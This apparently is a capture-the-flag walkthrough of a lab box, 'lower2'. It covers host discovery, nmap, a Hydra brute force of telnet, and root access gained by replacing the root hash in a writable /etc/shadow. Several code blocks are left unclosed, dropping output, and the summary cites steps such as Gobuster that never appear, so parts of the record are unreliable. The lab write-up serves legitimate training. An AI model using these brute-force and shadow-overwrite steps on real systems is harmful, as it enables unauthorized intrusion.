# 🔍 Network Discovery

Initially, scan the local network using `arp-scan` to identify active hosts.

```bash
$ sudo arp-scan  --localnet               
[sudo] password for arc:

# 🔎 Enumeration

## Nmap Scan

Perform a full TCP port scan:

```bash
$ nmap -n -Pn -sSV -p- --min-rate 5000  192.168.29.222 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-10 02:51 -0700

# 🌐 Web Enumeration

Open port 80 in the browser.

<img width="1292" height="447" alt="image" src="https://github.com/user-attachments/assets/ce1968e7-d70e-4561-9f85-028e42b06cec" />

### Observation

The website displayed the default Nginx page:

```text
It works!
```

This indicates the web service is active but does not expose any useful content.

# 🔓 Telnet Brute Force

Use Hydra to brute-force the Telnet service:

```bash
$ hydra -l b.taylor -P /usr/share/wordlists/rockyou.txt telnet://192.168.29.222 -t 64
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-10 03:03:36
[WARNING] telnet is by its nature unreliable to analyze, if possible better choose FTP, SSH, etc. if available
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task

# 🖥 Initial Access

Login through Telnet:

```bash
$ telnet 192.168.29.222 
Trying 192.168.29.222...
Connected to 192.168.29.222.
Escape character is '^]'.

lower2 login: b.taylor
Password: 
Last login: Sun May 10 17:33:47 CEST 2026 from 192.168.29.56 on pts/22

b.taylor@lower2:~$
```

## Verify User

```bash
b.taylor@lower2:~$ id ; hostname
uid=1000(b.taylor) gid=1000(b.taylor) grupos=1000(b.taylor),42(shadow)
lower2
```

Successfully gained access as user `b.taylor`.

---

# ⚠️ Critical Group Membership

The user belongs to the `shadow` group:

```text
42(shadow)
```

This group has permission to access `/etc/shadow`.

---

# 🔍 Searching for Writable Files

Search for writable files that may help with privilege escalation:

```bash
b.taylor@lower2:~$ find / -type f -writable 2</dev/null | grep -ivE "proc|var|sys|home"
/etc/shadow
```

This is a critical misconfiguration because `/etc/shadow` stores password hashes.

---

# 🔑 Extracting Root Password Hash

View the root user's hash:

```bash
b.taylor@lower2:~$ cat /etc/shadow | head -1
```

## Result

```text
root:$y$j9T$RDW/7EgA4sElvqxLVk.Uo.$OmF5Lm4Ub/UeC2ua6tTQnHB07WKpYs1lOXl.lS581q8
```

---

# 🔐 Generating a New Password Hash

Generate a new password hash using OpenSSL:

```bash
b.taylor@lower2:~$ openssl passwd -1 123456
$1$MrhCahom$tzh7m6/bU0NW1YNU6uqtS.
```

## New Password Hash

```text
$1$MrhCahom$tzh7m6/bU0NW1YNU6uqtS.
```

---

# ✏️ Modifying `/etc/shadow`

Edit the `/etc/shadow` file using `nano`and replace the existing root password hash with the newly generated hash.

## Modified Entry

```text
root:$1$MrhCahom$tzh7m6/bU0NW1YNU6uqtS.:20134:0:99999:7:::
```

Save the file and exit.

---

# 👑 Privilege Escalation

Switch to the root user:

```bash
su -
```

Enter password:

```text
123456
```

## Verification

```bash
root@lower2:~# id ; hostname
uid=0(root) gid=0(root) grupos=0(root)
lower2
```

Successfully escalated privileges to root.

---

# 🏁 Flags

## Locate Flags

```bash
root@lower2:~# find / -name root.txt -o -name user.txt 2</dev/null
/root/root.txt
/home/b.taylor/user.txt
```

---

# 📄 User Flag

```bash
root@lower2:~# cat /home/b.taylor/user.txt
```

```text
edc9f5c55af87505033a20***********
```

---

# 👑 Root Flag

```bash
root@lower2:~# cat /root/root.txt

# 🧾 Summary

| Phase | Technique |
|------|-----------|
| Network Discovery | arp-scan |
| Enumeration | Nmap |
| Web Enumeration | Gobuster |
| Information Disclosure | SSH Banner |
| Credential Attack | Hydra |
| Initial Access | Telnet |
| Privilege Escalation | Writable `/etc/shadow` |

---

# 🚀 Key Takeaways

- Service banners can leak valid usernames.
- Telnet remains highly insecure and vulnerable to brute-force attacks.
- Membership in the `shadow` group is extremely dangerous.
- Writable `/etc/shadow` leads directly to full system compromise.
- Misconfigured permissions are often enough for privilege escalation.
